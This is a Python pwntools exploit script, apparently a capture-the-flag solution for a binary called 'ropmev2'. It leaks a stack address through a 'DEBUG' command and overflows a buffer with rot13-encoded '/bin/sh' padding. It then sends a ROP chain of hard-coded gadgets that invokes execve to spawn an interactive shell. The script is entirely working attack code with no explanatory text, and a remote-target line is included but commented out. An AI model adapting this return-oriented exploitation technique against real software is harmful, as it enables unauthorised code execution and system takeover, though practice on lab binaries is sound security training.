#pop_rax = 0x0000000000401162
#pop_rdi = 0x000000000040142b
#pop_rsi = 0x0000000000401429
#pop_rdx = 0x0000000000401164
#syscall = 0x0000000000401168
from pwn import *

def rot13(s):
    chars = "abcdefghijklmnopqrstuvwxyz"
    trans = chars[13:]+chars[:13]
    rot_char = lambda c: trans[chars.find(c)] if chars.find(c)>-1 else c
    return ''.join( rot_char(c) for c in s ) 

context.terminal = ['urxvt','-e','sh','-c']
context.log_level = 'DEBUG'
#for local
sh = gdb.debug("./ropmev2")
#for remote
#sh = remote("ip",1234)
sh.recvline()
sh.sendline("DEBUG")
leak = sh.recvline()
leak = leak.decode()
leak = leak[25:]
print("LEAK IS  :",leak)

leak = int(leak,16)

pop_rax = p64(0x0000000000401162)
pop_rdi = p64(0x000000000040142b)
pop_rsi = p64(0x0000000000401429)
pop_rdx = p64(0x0000000000401164)
syscall = p64(0x0000000000401168)

'''
padding = cyclic(300)
padding = rot13(padding)
sh.sendline(padding)
'''
binshp = leak - 0xe0
binshp = p64(binshp)
#padding = "/ova/fu\x00".ljust(216,"a")
#padding = padding.encode()
padding = b'/ova/fu\x00'
padding = padding+b'a'*(216-len(padding))

payload = padding+pop_rdi+binshp+pop_rax+p64(0x3b)+pop_rsi+p64(0x00)*2+pop_rdx+p64(0x00)*2+syscall
sh.sendline(payload)

sh.interactive()
